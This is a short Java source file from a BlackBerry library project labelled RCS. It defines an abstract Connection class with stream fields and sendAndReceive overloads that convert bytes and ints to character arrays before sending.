/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib 
 * File         : Connection.java 
 * Created      : 26-mar-2010
 * *************************************************/
package com.ht.rcs.blackberry.transfer;

import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;

import javax.microedition.io.StreamConnection;

import com.ht.rcs.blackberry.utils.Utils;

public abstract class Connection {
    protected InputStreamReader _in;
    protected OutputStreamWriter _out;
    protected StreamConnection connection = null;

    public abstract boolean connect();

    public abstract byte[] sendAndReceive(char[] data) throws IOException;

    public byte[] sendAndReceive(byte[] message) throws IOException {
        return sendAndReceive(Utils.ByteArrayToCharArray(message));
    }

    public byte[] sendAndReceive(int value) throws IOException {
        return sendAndReceive(Utils.intToCharArray(value));
    }

}
